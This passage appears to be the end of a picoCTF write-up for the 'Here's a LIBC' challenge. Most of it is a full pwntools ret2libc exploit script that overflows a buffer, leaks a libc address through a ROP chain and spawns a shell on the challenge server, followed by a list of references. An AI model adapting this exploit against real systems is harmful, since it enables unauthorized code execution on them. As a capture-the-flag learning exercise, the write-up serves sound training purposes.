+You can choose to connect to the remote challenge server instead of running it locally. In our case of picoCTF challenge:
+
+```bash
+p = remote("mercury.picoctf.net", 62289) 
+```
+---
+
+## Full exploit script
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *  
+
+# Local debugging
+# p = process("./vuln")
+# gdb.attach(p)
+
+# Remote connection for CTF challenge
+p = remote("mercury.picoctf.net", 62289)
+
+offset = 136
+junk = b"A" * offset  # Padding to overflow up to return address
+
+"""
+Plan of attack:
+* Leak the address of setbuf using puts
+* Use ROP to control rdi and pass setbuf@got as argument to puts
+* Return to main to allow a second payload
+* Calculate base address of libc
+* Build second payload with system("/bin/sh")
+"""
+
+# ROP gadgets and addresses (from Ghidra or ROPgadget)
+pop_rdi = 0x400913
+setbuf_at_got = 0x601028
+puts_at_plt = 0x400540
+back_to_main = 0x400771
+
+# First payload: leak setbuf address
+payload = [
+    junk,
+    p64(pop_rdi),
+    p64(setbuf_at_got),
+    p64(puts_at_plt),
+    p64(back_to_main),
+]
+
+payload = b"".join(payload)
+p.sendline(payload)
+
+# Skip irrelevant lines and grab the leak
+p.recvline()
+p.recvline()
+leak = u64(p.recvline().strip().ljust(8, b"\x00"))
+log.info(f"{hex(leak)=}")
+
+# Calculate libc base
+setbuf_offset = 0x88540
+base_address_of_libc = leak - setbuf_offset
+log.info(f"{hex(base_address_of_libc)=}")
+
+# Calculate addresses of system() and "/bin/sh"
+system_offset = 0x4F4E0
+system_address = base_address_of_libc + system_offset
+
+bin_sh_offset = 0x1B40FA
+bin_sh_address = base_address_of_libc + bin_sh_offset
+
+# For stack alignment on x64
+ret_instruction = 0x40052E
+
+# Second payload: call system("/bin/sh")
+second_payload = [
+    junk,
+    p64(pop_rdi),
+    p64(bin_sh_address),
+    p64(ret_instruction),
+    p64(system_address),
+]
+
+second_payload = b"".join(second_payload)
+p.sendline(second_payload)
+
+# Get interactive shell
+p.interactive()
+```
+
+---
+
+## References and sources
+
+* [PicoCTF: Here's a LIBC](https://play.picoctf.org/practice/challenge/179?category=6&difficulty=3&originalEvent=34&page=1&search=)
+*  [YouTube: Binary exploitation with ret2libc](https://www.youtube.com/watch?v=tMN5N5oid2c&t=580s)
+* [Wikipedia: Return-to-libc attack](https://en.wikipedia.org/wiki/Return-to-libc_attack)
+* [iRed Team - ret2libc](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc)
+* [System Overlord - GOT and PLT for pwning](https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html)
+*  [pwninit - auto-patch binaries](https://github.com/io12/pwninit)
+*  [Understanding x86 Assembly](https://tirkarp.medium.com/understanding-x86-assembly-5d7d637efb5)
+* [Wikipedia: x86 calling conventions](https://en.wikipedia.org/wiki/X86_calling_conventions)
+* [pwninit (GitHub)](https://github.com/io12/pwninit)
+
